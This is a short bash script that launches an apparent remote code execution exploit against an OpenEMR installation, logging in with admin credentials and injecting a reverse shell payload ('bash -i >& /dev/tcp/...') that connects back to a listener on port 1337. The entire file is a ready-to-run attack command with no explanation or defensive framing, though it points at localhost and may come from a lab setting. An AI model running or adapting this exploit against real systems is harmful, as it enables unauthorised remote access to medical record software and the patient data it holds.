#!/bin/bash
python openemr_rce.py  -u admin -p pass -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1' http://localhost/openemr

